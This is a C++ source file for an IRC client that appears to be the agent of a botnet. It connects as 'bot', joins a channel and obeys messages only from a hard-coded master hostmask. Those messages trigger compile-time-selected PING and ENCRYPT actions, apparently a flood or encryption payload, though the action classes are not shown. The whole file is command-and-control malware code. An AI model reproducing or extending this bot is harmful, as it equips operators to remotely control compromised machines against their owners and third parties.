#include "IrcClient.hpp"

#include <sstream>
#include <iostream>
#include <string>
#include <csignal>

IrcClient::IrcClient(const char* server, int port)
    : server(server), port(port), session(nullptr) {
    memset(&callbacks, 0, sizeof(callbacks));
    callbacks.event_connect = event_connect;
    callbacks.event_quit = dump_event;
    callbacks.event_kick = dump_event;
    callbacks.event_topic = dump_event;
    callbacks.event_part = dump_event;
    callbacks.event_privmsg = dump_event;
    callbacks.event_unknown = event_unknown;
    registrationStatus = false;

    session = irc_create_session(&callbacks);
    if (!session) {
        throw std::runtime_error("Could not create IRC session");
    }
    irc_set_ctx(session, this);
}

IrcClient* IrcClient::getInstance(irc_session_t* session) {
    return static_cast<IrcClient*>(irc_get_ctx(session));
}

IrcClient::~IrcClient() {
    closeConnection();
}

void IrcClient::connect() {
    const char* placeholder = "IGNORE";
    if (irc_connect(session, server, port, nullptr, placeholder, placeholder, placeholder)) {
        closeConnection();
        throw std::runtime_error("Failed to connect to server");
    }

    if (irc_run(session)) {
        closeConnection();
        throw std::runtime_error("Error while connected to server");
    }
}

void IrcClient::signalHandler(int signal) {
    std::cout << "Interrupt signal (" << signal << ") received.\n";
    exit(signal);
}

std::string IrcClient::concatenateParams(const char* event, const char* origin, const char** params, unsigned int count) {
    std::string result;
    //printf("Event: %s\n", event);
    //printf("Origin: %s\n", origin);
    //printf("Params[0]: %s\n", params[0]);

    if (strcmp(origin, "") != 0) {
        result += origin;
        result += " ";
    }

    if (strcmp(event, "") != 0) {
        result += event;
        result += " ";
    }
    
    // Add each parameter
    for (unsigned int i = 0; i < count; ++i) {
        result += params[i];
        result += " ";
    }
    
    // Add the newline at the end
    //result += "\n";
    
    return result;
}

bool IrcClient::isRegistered() {
    return registrationStatus;
}

void IrcClient::sendCommand(const std::string& command) {
    if (session) {
        irc_send_raw(session, command.c_str());
    }
}

void IrcClient::closeConnection() {
    if (session) {
        irc_disconnect(session);
        irc_destroy_session(session);
        session = nullptr;
    }
}

void IrcClient::event_connect(irc_session_t* session, const char* event, const char* origin, const char** params, unsigned int count) {
    printf("Connected to server\n");

    IrcClient* instance = getInstance(session);
    if (instance) {
        instance->sendCommand("/VALIDATE test123 BOT");
        instance->sendCommand("/NICK bot");
        instance->sendCommand("/USER botNick 0 * botUser");
        instance->sendCommand("/JOIN #testChannel");
        instance->sendCommand("/LIST *");
        instance->sendCommand("/NAMES #testChannel");
    }
}

void IrcClient::event_unknown(irc_session_t* session, const char* event, const char* origin, const char** params, unsigned int count) {
    printf("event unknown hit\n");
    IrcClient::parseEvent(session, event, origin, params, count);
}

void IrcClient::dump_event(irc_session_t* session, const char* event, const char* origin, const char** params, unsigned int count) {
	printf("dump event hit\n");
    IrcClient::parseEvent(session, event, origin, params, count);
}
void IrcClient::parseEvent(irc_session_t* session, const char* event, const char* origin, const char** params, unsigned int count) {
    IrcClient* instance = getInstance(session);
    if (!instance) {
        return;
    }
    const char* tempEvent = event != nullptr && strcmp(event, "null") != 0 ? event : "";
    const char* tempOrigin = origin != nullptr && strcmp(origin, "null") != 0 ? origin : "";
    std::string receivedMessage = IrcClient::concatenateParams(tempEvent, tempOrigin, params, count);

    printf("Received message: %s\n", receivedMessage.c_str());

    if (strcmp(event, "(REGISTERED)") == 0) {
        instance->registrationStatus = true;
        return;
    }

    if (!instance->isRegistered()) {
        return;
    }
    
    ActionInfo actionInfo = MessageParser::parseMessage(receivedMessage, "Master!masterUser@192.168.1.17");
    instance->createAction(actionInfo);
}


void IrcClient::createAction(ActionInfo actionInfo) {
    IrcClient* instance = getInstance(session);
    Action* action = nullptr;
    printf("Create action hit\n");
    #ifdef ENABLE_PING_ACTION
    if (actionInfo.getActionType() == ActionType::PING) { // check if bot was compiled to support this
        printf("ping created\n");
        action = new PingAction(actionInfo.getActionParams());
    }
    #endif

    #ifdef ENABLE_ENCRYPT_ACTION
    if (actionInfo.getActionType() == ActionType::ENCRYPT) { // check if bot was compiled to support this
        printf("encrypt created\n");
        action = new EncryptAction(actionInfo.getActionParams(), instance);
    }
    #endif

    if (action) {
        action->execute();
        delete action;
    }
}

